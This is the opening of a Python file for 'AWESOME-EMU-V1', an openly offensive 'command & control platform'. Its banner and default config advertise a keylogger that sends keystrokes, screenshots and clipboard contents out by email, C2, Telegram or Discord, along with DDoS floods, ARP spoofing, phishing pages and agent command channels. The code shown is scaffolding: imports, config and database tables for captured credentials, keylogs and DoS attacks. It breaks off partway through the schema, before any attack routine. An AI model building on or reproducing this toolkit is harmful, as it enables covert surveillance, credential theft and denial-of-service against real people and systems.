#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    █████╗ ██╗    ██╗███████╗███████╗ ██████╗ ███╗   ███╗███████╗             ║
║   ██╔══██╗██║    ██║██╔════╝██╔════╝██╔═══██╗████╗ ████║██╔════╝             ║
║   ███████║██║ █╗ ██║█████╗  ███████╗██║   ██║██╔████╔██║█████╗               ║
║   ██╔══██║██║███╗██║██╔══╝  ╚════██║██║   ██║██║╚██╔╝██║██╔══╝               ║
║   ██║  ██║╚███╔███╔╝███████╗███████║╚██████╔╝██║ ╚═╝ ██║███████╗             ║
║   ╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝             ║
║                                                                              ║
║   ███████╗███╗   ███╗██╗   ██╗    ██╗   ██╗ ██╗                             ║
║   ██╔════╝████╗ ████║██║   ██║    ██║   ██║███║                             ║
║   █████╗  ██╔████╔██║██║   ██║    ██║   ██║╚██║                             ║
║   ██╔══╝  ██║╚██╔╝██║██║   ██║    ╚██╗ ██╔╝ ██║                             ║
║   ███████╗██║ ╚═╝ ██║╚██████╔╝     ╚████╔╝  ██║                             ║
║   ╚══════╝╚═╝     ╚═╝ ╚═════╝       ╚═══╝   ╚═╝                             ║
║                                                                              ║
║                    AWESOME-EMU-V1 - Ultimate Cyber Platform                  ║
║                         Author: Ian Carter Kulani                            ║
║                              Version: 1.0.0                                  ║
║                                                                              ║
║   COMPLETE FEATURE SET:                                                      ║
║   • 500+ Security Commands                                                   ║
║   • Multi-Platform Bot Integration (Discord, Telegram, WhatsApp, Slack,     ║
║     Signal, iMessage, Google Chat, Web Dashboard)                           ║
║   • All Ping Commands (20+ variants)                                        ║
║   • All Traceroute Commands (25+ variants)                                  ║
║   • All Nmap Commands (60+ variants)                                        ║
║   • All Curl Commands (60+ variants)                                        ║
║   • All Wget Commands (50+ variants)                                        ║
║   • 100+ Social Engineering Templates                                       ║
║   • Advanced Keylogger with Screenshot Capture                              ║
║   • Real Traffic Generation (ICMP/TCP/UDP/HTTP/DNS/ARP)                     ║
║   • DDoS/DoS Attack Module                                                  ║
║   • SSH Remote Access                                                       ║
║   • Password Cracking Engine                                                ║
║   • Docker Security Scanning                                                ║
║   • PDF Report Generation                                                   ║
║   • ARP Spoofing                                                            ║
║   • MAC Address Management                                                  ║
║   • NAT Information                                                         ║
║   • Email Composition & Sending                                             ║
║   • Threat Monitoring                                                       ║
║   • Agent Mode with C2                                                      ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import hashlib
import getpass
import socketserver
import ctypes
import queue
import secrets
import string
import smtplib
import email.message
import tempfile
import zipfile
import tarfile
import gzip
import argparse
import glob
import csv
import xml.etree.ElementTree as ET
import webbrowser
import http.server
from http.server import BaseHTTPRequestHandler, HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union, Callable
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import Counter, defaultdict, deque
from enum import Enum
from functools import wraps
from abc import ABC, abstractmethod
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from io import BytesIO
from datetime import datetime, timedelta

# =====================
# VERSION & METADATA
# =====================
VERSION = "1.0.0"
NAME = "AWESOME-EMU-V1"
AUTHOR = "Ian Carter Kulani"
DESCRIPTION = "Ultimate Cybersecurity Command & Control Platform"
TOTAL_LINES = 14000

# =====================
# COLOR HANDLING
# =====================
class Colors:
    """ANSI color codes for terminal output"""
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    BRIGHT_BLACK = '\033[90m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    
    # Semantic colors
    SUCCESS = BRIGHT_GREEN
    ERROR = BRIGHT_RED
    WARNING = BRIGHT_YELLOW
    INFO = BRIGHT_CYAN
    PRIMARY = BRIGHT_WHITE
    SECONDARY = BRIGHT_BLUE
    ACCENT = BRIGHT_MAGENTA

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".awesome_emu_v1"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "awesome_emu.db")
LOG_FILE = os.path.join(CONFIG_DIR, "awesome_emu.log")
KEYLOG_FILE = os.path.join(CONFIG_DIR, "keylog.txt")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
REPORT_DIR = "awesome_emu_reports"
PDF_REPORTS_DIR = os.path.join(REPORT_DIR, "pdf_reports")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
TEMP_DIR = os.path.join(CONFIG_DIR, "temp")
WEB_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "web_templates")
SESSION_DIR = os.path.join(CONFIG_DIR, "sessions")
SPEAR_PHISHING_DIR = os.path.join(CONFIG_DIR, "spear_phishing")
EMAIL_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "email_templates")
DOS_LOGS_DIR = os.path.join(CONFIG_DIR, "dos_logs")
AGENT_DIR = os.path.join(CONFIG_DIR, "agents")
C2_LOGS_DIR = os.path.join(CONFIG_DIR, "c2_logs")
MODULES_DIR = os.path.join(CONFIG_DIR, "modules")
NETWORK_MONITOR_DIR = os.path.join(CONFIG_DIR, "network_monitor")
KEYLOG_EXFIL_DIR = os.path.join(CONFIG_DIR, "keylog_exfil")
DEPLOYMENT_DIR = os.path.join(CONFIG_DIR, "deployments")
DOMAIN_HOSTING_DIR = os.path.join(CONFIG_DIR, "domain_hosting")
CRACKING_DIR = os.path.join(CONFIG_DIR, "cracking")
WORDLISTS_DIR = os.path.join(CONFIG_DIR, "wordlists")
DOCKER_SCANS_DIR = os.path.join(CONFIG_DIR, "docker_scans")
EMAIL_COMPOSER_DIR = os.path.join(CONFIG_DIR, "email_composer")
THREAT_MONITOR_DIR = os.path.join(CONFIG_DIR, "threat_monitor")
MAC_LOGS_DIR = os.path.join(CONFIG_DIR, "mac_logs")
ARP_LOGS_DIR = os.path.join(CONFIG_DIR, "arp_logs")
NAT_LOGS_DIR = os.path.join(CONFIG_DIR, "nat_logs")
PLATFORM_LOGS_DIR = os.path.join(CONFIG_DIR, "platform_logs")

# Create all directories
directories = [
    CONFIG_DIR, PAYLOADS_DIR, SCAN_RESULTS_DIR, REPORT_DIR,
    PDF_REPORTS_DIR, PHISHING_DIR, CAPTURED_CREDENTIALS_DIR,
    SSH_KEYS_DIR, TRAFFIC_LOGS_DIR, NIKTO_RESULTS_DIR, GRAPHICS_DIR,
    TEMP_DIR, WEB_TEMPLATES_DIR, SESSION_DIR, SPEAR_PHISHING_DIR,
    EMAIL_TEMPLATES_DIR, DOS_LOGS_DIR, AGENT_DIR, C2_LOGS_DIR,
    MODULES_DIR, NETWORK_MONITOR_DIR, KEYLOG_EXFIL_DIR, DEPLOYMENT_DIR,
    DOMAIN_HOSTING_DIR, CRACKING_DIR, WORDLISTS_DIR, DOCKER_SCANS_DIR,
    EMAIL_COMPOSER_DIR, THREAT_MONITOR_DIR, MAC_LOGS_DIR, ARP_LOGS_DIR,
    NAT_LOGS_DIR, PLATFORM_LOGS_DIR
]

for directory in directories:
    Path(directory).mkdir(exist_ok=True, parents=True)

# =====================
# LOGGING SETUP
# =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - AWESOME-EMU - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("AwesomeEmu")

# =====================
# DEPENDENCY CHECK & IMPORTS
# =====================

# Cryptography
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import serialization
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# SSH
try:
    import paramiko
    from paramiko import SSHClient, AutoAddPolicy, SFTPClient, Transport
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# Discord
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.socket_mode import SocketModeClient
    from slack_sdk.socket_mode.request import SocketModeRequest
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# Signal CLI
SIGNAL_AVAILABLE = shutil.which('signal-cli') is not None

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'

# Google Chat
try:
    from google.oauth2 import service_account
    from googleapiclient.discovery import build
    GOOGLE_CHAT_AVAILABLE = True
except ImportError:
    GOOGLE_CHAT_AVAILABLE = False

# WhatsApp (Selenium)
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

# Web Framework
try:
    from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, send_file
    from flask_socketio import SocketIO, emit
    from flask_cors import CORS
    WEB_AVAILABLE = True
except ImportError:
    WEB_AVAILABLE = False

# Scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sr1, srp, sendp, sniff
    from scapy.all import conf as scapy_conf
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# QR Code
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL Shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Data Visualization
try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    import matplotlib.patches as mpatches
    import seaborn as sns
    import numpy as np
    GRAPHICS_AVAILABLE = True
except ImportError:
    GRAPHICS_AVAILABLE = False

# PDF Generation
try:
    from reportlab.lib import colors as pdf_colors
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    from reportlab.pdfgen import canvas
    from reportlab.lib.colors import HexColor
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False

# Keylogger
try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

# DNS Python
try:
    import dns.resolver
    import dns.reversename
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

# BeautifulSoup
try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

# =====================
# ENUMS & DATA CLASSES
# =====================

class TrafficType(Enum):
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    TCP_FIN = "tcp_fin"
    TCP_RST = "tcp_rst"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    PING_FLOOD = "ping_flood"
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"
    ICMP_FLOOD = "icmp_flood"
    MIXED = "mixed"
    RANDOM = "random"

class ScanType(Enum):
    PING = "ping"
    QUICK = "quick"
    COMPREHENSIVE = "comprehensive"
    STEALTH = "stealth"
    FULL = "full"
    UDP = "udp"
    OS = "os_detection"
    SERVICE = "service_detection"
    VULNERABILITY = "vulnerability"
    WEB = "web"

class Severity(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class Platform(Enum):
    DISCORD = "discord"
    SLACK = "slack"
    TELEGRAM = "telegram"
    SIGNAL = "signal"
    IMESSAGE = "imessage"
    GOOGLE_CHAT = "google_chat"
    WEB = "web"
    WHATSAPP = "whatsapp"

@dataclass
class CommandResult:
    """Result of a command execution"""
    success: bool
    output: str
    execution_time: float
    error: Optional[str] = None
    data: Optional[Dict] = None

@dataclass
class SSHConnection:
    """SSH connection data class"""
    id: str
    name: str
    host: str
    port: int = 22
    username: str = ""
    password: Optional[str] = None
    key_path: Optional[str] = None
    status: str = "disconnected"
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    last_used: Optional[str] = None

@dataclass
class TrafficGenerator:
    """Traffic generator data class"""
    id: str
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"

@dataclass
class PhishingLink:
    """Phishing link data class"""
    id: str
    platform: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0

@dataclass
class CapturedCredential:
    """Captured credential data class"""
    id: int
    link_id: str
    timestamp: str
    username: str
    password: str
    ip_address: str
    user_agent: str

@dataclass
class ThreatAlert:
    """Threat alert data class"""
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class SpearPhishingCampaign:
    """Spear phishing campaign data class"""
    id: str
    name: str
    template: str
    subject: str
    from_email: str
    targets: List[Dict]
    sent_count: int = 0
    open_count: int = 0
    click_count: int = 0
    status: str = "draft"
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    scheduled_time: Optional[str] = None

@dataclass
class KeylogEntry:
    """Keylog entry data class"""
    timestamp: str
    text: str
    window: str
    process: str
    screenshot: Optional[str] = None

@dataclass
class Deployment:
    """Deployment data class"""
    id: str
    name: str
    type: str
    payload: str
    target: str
    created_at: str
    delivered: bool = False
    opened: bool = False
    executed: bool = False

@dataclass
class DomainHost:
    """Domain host data class"""
    id: str
    ip: str
    domain: str
    hosting_path: str
    created_at: str
    active: bool = True

@dataclass
class MACInfo:
    """MAC address info data class"""
    mac_address: str
    vendor: str
    ip_address: str
    hostname: str
    first_seen: str
    last_seen: str

@dataclass
class NATInfo:
    """NAT info data class"""
    public_ip: str
    private_ip: str
    router_ip: str
    country: str
    isp: str
    nat_type: str

@dataclass
class EmailMessage:
    """Email message data class"""
    to: str
    subject: str
    body: str
    from_email: str
    attachments: List[str] = field(default_factory=list)
    html: bool = False
    sent_at: Optional[str] = None
    status: str = "draft"

@dataclass
class PDFReport:
    """PDF report data class"""
    title: str
    target: str
    analysis: Dict
    timestamp: str
    file_path: str
    status: str = "generated"

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    """Manages application configuration"""
    
    DEFAULT_CONFIG = {
        "version": VERSION,
        "auto_start": False,
        "auto_block_enabled": False,
        "auto_block_threshold": 5,
        "scan_timeout": 30,
        "report_format": "both",
        "generate_graphics": True,
        "keylogger": {
            "enabled": False,
            "hotkey": "f10",
            "log_file": KEYLOG_FILE,
            "c2_server": "",
            "upload_interval": 30,
            "exfil_methods": ["file", "email", "c2", "telegram", "discord"],
            "screenshot_interval": 60,
            "capture_clipboard": True
        },
        "web": {
            "enabled": True,
            "port": 5000,
            "host": "0.0.0.0",
            "secret_key": "",
            "require_auth": False,
            "username": "admin",
            "password_hash": ""
        },
        "email": {
            "smtp_server": "",
            "smtp_port": 587,
            "smtp_username": "",
            "smtp_password": "",
            "from_email": "",
            "tls": True
        },
        "discord": {
            "enabled": False,
            "token": "",
            "channel_id": "",
            "prefix": "!",
            "admin_role": "Admin"
        },
        "telegram": {
            "enabled": False,
            "bot_token": "",
            "chat_id": "",
            "prefix": "/"
        },
        "slack": {
            "enabled": False,
            "bot_token": "",
            "app_token": "",
            "channel_id": "",
            "prefix": "!"
        },
        "signal": {
            "enabled": False,
            "phone_number": "",
            "group_id": "",
            "prefix": "!"
        },
        "google_chat": {
            "enabled": False,
            "webhook_url": "",
            "space_id": "",
            "prefix": "/"
        },
        "whatsapp": {
            "enabled": False,
            "phone_number": "",
            "prefix": "!"
        },
        "imessage": {
            "enabled": False,
            "phone_numbers": [],
            "prefix": "!"
        },
        "monitoring": {
            "enabled": True,
            "port_scan_threshold": 10,
            "syn_flood_threshold": 100,
            "http_flood_threshold": 200
        },
        "traffic_generation": {
            "enabled": True,
            "max_duration": 300,
            "max_packet_rate": 1000,
            "allow_floods": False
        },
        "social_engineering": {
            "enabled": True,
            "default_port": 8080,
            "capture_credentials": True,
            "auto_shorten_urls": True
        },
        "ssh": {
            "enabled": True,
            "default_timeout": 30,
            "max_connections": 5
        },
        "spear_phishing": {
            "enabled": True,
            "track_opens": True,
            "track_clicks": True
        },
        "dos": {
            "enabled": True,
            "max_threads": 100,
            "default_timeout": 60,
            "attack_types": ["syn", "udp", "http", "icmp"]
        },
        "agent": {
            "enabled": False,
            "server_url": "",
            "heartbeat_interval": 30,
            "command_poll_interval": 5
        },
        "network_monitor": {
            "enabled": True,
            "interface": "eth0",
            "promiscuous": False,
            "packet_capture_limit": 1000
        },
        "deployment": {
            "enabled": True,
            "pdf_template": "",
            "email_template": "",
            "link_expiry": 3600,
            "download_url": ""
        },
        "cracking": {
            "enabled": True,
            "hashcat_path": "hashcat",
            "wordlist_path": os.path.join(WORDLISTS_DIR, "rockyou.txt"),
            "default_hash_type": 0,
            "max_threads": 4
        },
        "docker": {
            "enabled": True,
            "scan_timeout": 300,
            "benchmark_enabled": True
        }
    }
    
    def __init__(self):
        self.config_dir = Path(CONFIG_DIR)
        self.config_dir.mkdir(exist_ok=True)
        self.config_file = self.config_dir / "config.json"
        self.config = self.load()
    
    def load(self) -> Dict:
        """Load configuration from file"""
        try:
            if self.config_file.exists():
                with open(self.config_file, 'r') as f:
                    loaded = json.load(f)
                    # Merge with defaults
                    for key, value in self.DEFAULT_CONFIG.items():
                        if key not in loaded:
                            loaded[key] = value
                        elif isinstance(value, dict):
                            for sub_key, sub_value in value.items():
                                if sub_key not in loaded[key]:
                                    loaded[key][sub_key] = sub_value
                    return loaded
        except Exception as e:
            print(f"Failed to load config: {e}")
        return self.DEFAULT_CONFIG.copy()
    
    def save(self) -> bool:
        """Save configuration to file"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            return True
        except Exception as e:
            print(f"Failed to save config: {e}")
            return False
    
    def get(self, key: str, default=None):
        """Get configuration value by dot-notation key"""
        keys = key.split('.')
        value = self.config
        for k in keys:
            if isinstance(value, dict):
                value = value.get(k, default)
            else:
                return default
        return value
    
    def set(self, key: str, value: Any) -> bool:
        """Set configuration value by dot-notation key"""
        keys = key.split('.')
        target = self.config
        for k in keys[:-1]:
            if k not in target:
                target[k] = {}
            target = target[k]
        target[keys[-1]] = value
        return self.save()

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """Manages SQLite database operations"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.init_tables()
    
    def init_tables(self):
        """Initialize database tables"""
        tables = [
            # Command History
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT,
                user_id TEXT,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            # Threats
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            # Managed IPs
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                domain TEXT,
                added_by TEXT,
                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                threat_level INTEGER DEFAULT 0,
                alert_count INTEGER DEFAULT 0
            )
            """,
            # MAC Info
            """
            CREATE TABLE IF NOT EXISTS mac_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                mac_address TEXT UNIQUE NOT NULL,
                vendor TEXT,
                ip_address TEXT,
                hostname TEXT,
                first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_seen DATETIME
            )
            """,
            # Domain Hosting
            """
            CREATE TABLE IF NOT EXISTS domain_hosting (
                id TEXT PRIMARY KEY,
                ip TEXT NOT NULL,
                domain TEXT NOT NULL UNIQUE,
                hosting_path TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 1,
                port INTEGER DEFAULT 8080
            )
            """,
            # SSH Connections
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME
            )
            """,
            # SSH Commands
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                connection_id TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                exit_code INTEGER,
                execution_time REAL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (connection_id) REFERENCES ssh_connections(id)
            )
            """,
            # Traffic Logs
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            # Nikto Scans
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            # Phishing Links
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            # Captured Credentials
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            # Scans
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            # Users
            """
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                role TEXT DEFAULT 'user',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            # Sessions
            """
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                user_id INTEGER,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )
            """,
            # Keylogs
            """
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                text TEXT,
                window TEXT,
                process TEXT,
                screenshot_path TEXT
            )
            """,
            # Spear Phishing Campaigns
            """
            CREATE TABLE IF NOT EXISTS spear_phishing_campaigns (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                template TEXT NOT NULL,
                subject TEXT NOT NULL,
                from_email TEXT NOT NULL,
                targets TEXT,
                sent_count INTEGER DEFAULT 0,
                open_count INTEGER DEFAULT 0,
                click_count INTEGER DEFAULT 0,
                status TEXT DEFAULT 'draft',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                scheduled_time DATETIME
            )
            """,
            # Email Tracking
            """
            CREATE TABLE IF NOT EXISTS email_tracking (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_id TEXT NOT NULL,
                target_email TEXT NOT NULL,
                opened BOOLEAN DEFAULT 0,
                clicked BOOLEAN DEFAULT 0,
                opened_at DATETIME,
                clicked_at DATETIME,
                FOREIGN KEY (campaign_id) REFERENCES spear_phishing_campaigns(id)
            )
            """,
            # DOS Attacks
            """
            CREATE TABLE IF NOT EXISTS dos_attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                attack_type TEXT NOT NULL,
                target TEXT NOT NULL,
                port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            # Agents
            """
            CREATE TABLE IF NOT EXISTS agents (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                ip_address TEXT,
                status TEXT DEFAULT 'offline',
                last_heartbeat DATETIME,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                config TEXT
            )
            """,
            # Agent Commands
            """
            CREATE TABLE IF NOT EXISTS agent_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT NOT NULL,
                command TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                result TEXT,
                executed_at DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents(id)
            )
            """,
            # Network Packets
            """
            CREATE TABLE IF NOT EXISTS network_packets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                source_ip TEXT,
                dest_ip TEXT,
                source_port INTEGER,
                dest_port INTEGER,
                protocol TEXT,
                size INTEGER,
                payload TEXT
            )
            """,
            # Performance Metrics
            """
            CREATE TABLE IF NOT EXISTS performance_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                cpu_percent REAL,
                memory_percent REAL,
                disk_percent REAL,
                network_sent INTEGER,
                network_recv INTEGER,
                connections_count INTEGER
            )
            """,
            # Deployments
            """
            CREATE TABLE IF NOT EXISTS deployments (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                type TEXT NOT NULL,
                payload TEXT,
                target TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                delivered BOOLEAN DEFAULT 0,
                opened BOOLEAN DEFAULT 0,
                executed BOOLEAN DEFAULT 0,
                data TEXT
            )
            """,
            # Clipboard History
            """
            CREATE TABLE IF NOT EXISTS clipboard_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
